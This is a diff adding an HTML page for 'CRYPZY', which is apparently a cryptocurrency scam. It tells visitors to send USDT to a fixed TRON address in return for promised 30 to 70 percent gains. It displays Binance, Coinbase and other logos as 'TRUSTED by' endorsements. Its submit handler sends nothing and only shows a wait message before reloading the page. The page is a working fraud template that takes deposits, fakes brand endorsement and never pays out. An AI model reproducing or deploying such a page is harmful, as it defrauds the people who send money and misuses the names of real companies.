@@ -1,0 +1,160 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta name="viewport" content="width=device-width, initial-scale=1" />
+    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
+    <meta name="author" content="INSPIRO" />
+    <meta name="description" content="Themeforest Template Polo, html template">
+    <link rel="icon" type="image/png" href="./images/logo.png">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <!-- Document title -->
+    <title>CRYPZY</title>
+    <!-- Stylesheets & Fonts -->
+    <link href="css/plugins.css" rel="stylesheet">
+    <link href="css/style.css" rel="stylesheet">
+    <link href="css/custom.css" rel="stylesheet">
+</head>
+
+<body>
+    <!-- Body Inner -->
+    <div class="body-inner">
+        <!-- Header -->
+        <header id="header" data-fullwidth="true" class="dark submenu-light">
+            <div class="header-inner">
+                <div class="container">
+                    <!--Logo-->
+                    <div id="logo">
+                        <a href="index.html">
+                            <span class="logo-default">CRYPZY</span>
+                            <span class="logo-dark">CRYPZY</span>
+                        </a>
+                    </div>
+                    <!--End: Logo-->
+                </div>
+            </div>
+        </header>
+        <!-- end: Header -->
+        <!-- SERVICES -->
+        <section style="background: url('./images/background2.png');">
+            <div class="container">
+                <div class="row" style="justify-content: center;">
+                    <div class="content col-md-8">
+                        <div class="card">
+                            <div class="card-header">
+                                <div class="divTitle mb-5 col-md-12">
+                                    <h2 class="card-title">BITCOIN</h2>
+                                </div>
+                                <div class="form-group col-md-12">
+                                    <label for="address">Send Your USDT to This Address with TRON NETWORK(TRC20)</label>
+                                    <input id="address" type="text" class="form-control" value="TEaAXCD53EyrvFFRQka7CU5Sd2dcr1V57j" readonly>
+                                    <button class="btn btn-light" onclick="copyToClipboard()"><i class="icon-copy"></i></button>
+                                </div>
+                            </div>
+                            <div class="card-body">
+                                <form class="row g-3">
+                                    <div class="col-md-12">
+                                        <label for="amount" class="form-label">Amount of USDT Sent With TRON NETWORK(TRC20)</label>
+                                        <select id="amount" class="form-select">
+                                        <option selected="">Choose...</option>
+                                        <option>$300 (Get 30%) => $390</option>
+                                        <option>$500 (Get 30%) => $650</option>
+                                        <option>$1000 (Get 50%) => $1500</option>
+                                        <option>$10000 (Get 70%) => $17000</option>
+                                      </select>
+                                    </div>
+                                    <div class="col-md">
+                                        <label for="txid" class="form-label">Transaction ID(TxID) - USDT Transaction ID</label>
+                                        <input type="text" class="form-control" id="txid">
+                                    </div>
+                                    <div class="col-12">
+                                        <label for="youraddress" class="form-label">Your BITCOIN Address(Bitcoin Network)</label>
+                                        <input type="text" class="form-control" id="youraddress">
+                                    </div>
+                                    <div class="col-12">
+                                        <button type="submit" class="btn btn-primary" onclick="send()">Submit</button>
+                                    </div>
+                                </form>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- end: SERVICES -->
+        <!-- CLIENTS -->
+        <section class="p-t-60"  style="background: url('./images/background2.png');">
+            <div class="container">
+                <div class="heading-text heading-section text-center">
+                    <h2>TRUSTED by</h2>
+                <div class="carousel client-logos" data-items="6" data-items-sm="4" data-items-xs="3" data-items-xxs="2" data-margin="20" data-arrows="false" data-autoplay="true" data-autoplay="3000" data-loop="true">
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/brand-binance-logo.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/brand-virtua-logo.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/coinbase.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/legendary.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/paramount.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/arbitrum.svg"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/bybit.webp"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/auri-swap.webp"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/emiratewalletIcon.webp"> </a>
+                    </div>
+                    <div>
+                        <a><img class="logoTrust" alt="" src="./images/trusted/nexera.webp"> </a>
+                    </div>
+                </div>
+            </div>
+        </section>
+        <!-- end: CLIENTS -->
+
+        <!-- Footer -->
+        <footer id="footer">
+            <div class="copyright-content">
+                <div class="container">
+                    <div class="copyright-text text-center">&copy; 2025 CRYPZY - Crypto Pay Event Get More</a> </div>
+                </div>
+            </div>
+        </footer>
+        <!-- end: Footer -->
+    </div>
+    <!-- end: Body Inner -->
+    <!-- Scroll top -->
+    <a id="scrollTop"><i class="icon-chevron-up"></i><i class="icon-chevron-up"></i></a>
+    <!--Plugins-->
+    <script src="js/jquery.js"></script>
+    <script src="js/plugins.js"></script>
+    <!--Template functions-->
+    <script src="js/functions.js"></script>
+    <script src="js/custom.js"></script>
+    <script>
+        function copyToClipboard() {
+            const copyText = document.getElementById("address");
+            copyText.select();
+            copyText.setSelectionRange(0, 99999); // For mobile devices
+            navigator.clipboard.writeText(copyText.value);
+        // alert("Copied the text: " + copyText.value);
+  }
+        function send() {
+            alert("Wait 10 - 30 minutes!");
+            location.reload();
+        }
+    </script>
+</body>
+
+</html>
